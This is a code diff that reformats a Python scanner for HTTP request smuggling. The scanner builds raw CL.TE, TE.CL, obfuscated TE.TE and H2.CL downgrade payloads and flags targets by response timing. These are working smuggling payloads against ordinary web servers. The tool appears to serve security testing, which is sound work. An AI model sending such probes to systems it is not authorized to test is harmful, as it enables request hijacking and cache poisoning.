@@ -73,11 +73,11 @@ class SmuggleTechnique:
 
 @dataclass
 class SmuggleProbe:
-    technique: str                   # SmuggleTechnique.*
+    technique: str  # SmuggleTechnique.*
     host: str
     port: int
     use_tls: bool
-    raw_bytes: bytes                 # exact wire-level payload
+    raw_bytes: bytes  # exact wire-level payload
     notes: str = ""
 
     def to_dict(self):
@@ -95,7 +95,9 @@ class SmuggleProbe:
 class SmuggleReport:
     target_url: str
     baseline_latency_ms: int = 0
-    results: List[Dict] = field(default_factory=list)  # [{technique, vulnerable, latency_ms, notes}]
+    results: List[Dict] = field(
+        default_factory=list
+    )  # [{technique, vulnerable, latency_ms, notes}]
     evidence: List[str] = field(default_factory=list)
     errors: List[str] = field(default_factory=list)
 
@@ -139,7 +141,7 @@ def build_cl_te_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe
     body = f"0\r\n\r\n{smuggled}"
     # CL deliberately too small so origin (TE parser) stops after 0-chunk
     # and "GET /" lands as the next request on the back-end connection.
-    cl = 4   # "0\r\n\r\n"  edge forwards just the first 4 bytes? — use 5 for safety
+    cl = 4  # "0\r\n\r\n"  edge forwards just the first 4 bytes? — use 5 for safety
     raw = (
         f"POST / HTTP/1.1\r\n"
         f"Host: {host}\r\n"
@@ -150,8 +152,11 @@ def build_cl_te_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe
         f"{body}"
     ).encode("utf-8")
     return SmuggleProbe(
-        technique=SmuggleTechnique.CL_TE, host=host, port=port,
-        use_tls=tls, raw_bytes=raw,
+        technique=SmuggleTechnique.CL_TE,
+        host=host,
+        port=port,
+        use_tls=tls,
+        raw_bytes=raw,
         notes="CL.TE — edge trusts CL, origin trusts TE. Origin sees smuggled GET as next request.",
     )
 
@@ -173,21 +178,27 @@ def build_te_cl_probe(target_url: str, smuggled_path: str = "/") -> SmuggleProbe
     raw = (
         f"POST / HTTP/1.1\r\n"
         f"Host: {host}\r\n"
-        f"Content-Length: 4\r\n"          # edge will ignore; origin uses
+        f"Content-Length: 4\r\n"  # edge will ignore; origin uses
         f"Transfer-Encoding: chunked\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Connection: keep-alive\r\n\r\n"
         f"{body}"
     ).encode("utf-8")
     return SmuggleProbe(
-        technique=SmuggleTechnique.TE_CL, host=host, port=port,
-        use_tls=tls, raw_bytes=raw,
+        technique=SmuggleTechnique.TE_CL,
+        host=host,
+        port=port,
+        use_tls=tls,
+        raw_bytes=raw,
         notes="TE.CL — edge parses chunked, origin reads CL bytes; smuggled request left on the socket.",
     )
 
 
-def build_te_te_probe(target_url: str, smuggled_path: str = "/",
-                      te_obfuscation: str = "Transfer-Encoding : chunked") -> SmuggleProbe:
+def build_te_te_probe(
+    target_url: str,
+    smuggled_path: str = "/",
+    te_obfuscation: str = "Transfer-Encoding : chunked",
+) -> SmuggleProbe:
     """TE.TE: both layers parse TE, but one is fooled into ignoring it
     by an obfuscated header, falling back to CL.
 
@@ -211,8 +222,11 @@ def build_te_te_probe(target_url: str, smuggled_path: str = "/",
         f"{body}"
     ).encode("utf-8")
     return SmuggleProbe(
-        technique=SmuggleTechnique.TE_TE, host=host, port=port,
-        use_tls=tls, raw_bytes=raw,
+        technique=SmuggleTechnique.TE_TE,
+        host=host,
+        port=port,
+        use_tls=tls,
+        raw_bytes=raw,
         notes=f"TE.TE — one layer misparses '{te_obfuscation}' and falls back to CL.",
     )
 
@@ -238,15 +252,18 @@ def build_h2_downgrade_probe(target_url: str, smuggled_path: str = "/") -> Smugg
     raw = (
         f"POST / HTTP/1.1\r\n"
         f"Host: {host}\r\n"
-        f"Content-Length: 0\r\n"           # h2 pseudo-header CL override
+        f"Content-Length: 0\r\n"  # h2 pseudo-header CL override
         f"Transfer-Encoding: chunked\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Connection: keep-alive\r\n\r\n"
         f"{body}"
     ).encode("utf-8")
     return SmuggleProbe(
-        technique=SmuggleTechnique.H2_CL, host=host, port=port,
-        use_tls=tls, raw_bytes=raw,
+        technique=SmuggleTechnique.H2_CL,
+        host=host,
+        port=port,
+        use_tls=tls,
+        raw_bytes=raw,
         notes="H2.CL — simulates h2→h1 downgrade where CL pseudo-header smuggled through proxy.",
     )
 
@@ -254,16 +271,18 @@ def build_h2_downgrade_probe(target_url: str, smuggled_path: str = "/") -> Smugg
 # ── Timing detector ───────────────────────────────────────────────
 
 
-def _raw_send(probe: SmuggleProbe, timeout: float,
-              sender: Optional[Callable] = None) -> Dict:
+def _raw_send(
+    probe: SmuggleProbe, timeout: float, sender: Optional[Callable] = None
+) -> Dict:
     """Send raw bytes, measure first-byte latency.
 
     `sender(host, port, use_tls, raw_bytes, timeout) -> (status, elapsed_ms, note)`
     is injectable for tests.
     """
     if sender is not None:
-        status, elapsed_ms, note = sender(probe.host, probe.port, probe.use_tls,
-                                           probe.raw_bytes, timeout)
+        status, elapsed_ms, note = sender(
+            probe.host, probe.port, probe.use_tls, probe.raw_bytes, timeout
+        )
         return {"status": status, "elapsed_ms": elapsed_ms, "note": note}
 
     t0 = time.time()
@@ -312,11 +331,13 @@ def _raw_send(probe: SmuggleProbe, timeout: float,
     return {"status": status, "elapsed_ms": elapsed_ms, "note": note}
 
 
-def detect_smuggling(target_url: str,
-                     techniques: Optional[List[str]] = None,
-                     timeout: float = 6.0,
-                     baseline_samples: int = 3,
-                     sender: Optional[Callable] = None) -> SmuggleReport:
+def detect_smuggling(
+    target_url: str,
+    techniques: Optional[List[str]] = None,
+    timeout: float = 6.0,
+    baseline_samples: int = 3,
+    sender: Optional[Callable] = None,
+) -> SmuggleReport:
     """Build probes, compare their first-byte latency to a baseline.
 
     A probe is considered suspicious if:
@@ -334,13 +355,16 @@ def detect_smuggling(target_url: str,
     # Baseline: plain OPTIONS, averaged
     host, port, tls = _base_host_port(target_url)
     baseline_bytes = (
-        f"OPTIONS / HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Connection: close\r\n\r\n"
+        f"OPTIONS / HTTP/1.1\r\n" f"Host: {host}\r\n" f"Connection: close\r\n\r\n"
     ).encode("utf-8")
     baseline_probe = SmuggleProbe(
-        technique="baseline", host=host, port=port, use_tls=tls,
-        raw_bytes=baseline_bytes, notes="OPTIONS latency baseline")
+        technique="baseline",
+        host=host,
+        port=port,
+        use_tls=tls,
+        raw_bytes=baseline_bytes,
+        notes="OPTIONS latency baseline",
+    )
     samples = []
     for _ in range(max(1, baseline_samples)):
         r = _raw_send(baseline_probe, timeout, sender=sender)
@@ -348,11 +372,13 @@ def detect_smuggling(target_url: str,
     mean = sum(samples) / len(samples)
     if len(samples) > 1:
         var = sum((s - mean) ** 2 for s in samples) / (len(samples) - 1)
-        stdev = var ** 0.5
+        stdev = var**0.5
     else:
         stdev = max(mean * 0.2, 50)
     report.baseline_latency_ms = int(mean)
-    report.evidence.append(f"baseline n={len(samples)} mean={int(mean)}ms stdev={int(stdev)}ms")
+    report.evidence.append(
+        f"baseline n={len(samples)} mean={int(mean)}ms stdev={int(stdev)}ms"
+    )
 
     # Map technique → builder
     builders = {
@@ -376,18 +402,19 @@ def detect_smuggling(target_url: str,
             report.errors.append(f"{t} build error: {exc}")
             continue
         res = _raw_send(probe, timeout, sender=sender)
-        suspicious = (
-            res["elapsed_ms"] > threshold or
-            "timeout" in (res.get("note") or "")
+        suspicious = res["elapsed_ms"] > threshold or "timeout" in (
+            res.get("note") or ""
         )
-        report.results.append({
-            "technique": t,
-            "vulnerable": suspicious,
-            "latency_ms": res["elapsed_ms"],
-            "status": res["status"],
-            "note": res.get("note", ""),
-            "threshold_ms": int(threshold),
-        })
+        report.results.append(
+            {
+                "technique": t,
+                "vulnerable": suspicious,
+                "latency_ms": res["elapsed_ms"],
+                "status": res["status"],
+                "note": res.get("note", ""),
+                "threshold_ms": int(threshold),
+            }
+        )
         report.evidence.append(
             f"{t}: latency={res['elapsed_ms']}ms status={res['status']} note={res.get('note','')} "
             f"{'SUSPICIOUS' if suspicious else 'clean'}"
@@ -397,7 +424,12 @@ def detect_smuggling(target_url: str,
 
 
 __all__ = [
-    "SmuggleProbe", "SmuggleReport", "SmuggleTechnique",
-    "build_cl_te_probe", "build_te_cl_probe", "build_te_te_probe",
-    "build_h2_downgrade_probe", "detect_smuggling",
+    "SmuggleProbe",
+    "SmuggleReport",
+    "SmuggleTechnique",
+    "build_cl_te_probe",
+    "build_te_cl_probe",
+    "build_te_te_probe",
+    "build_h2_downgrade_probe",
+    "detect_smuggling",
 ]
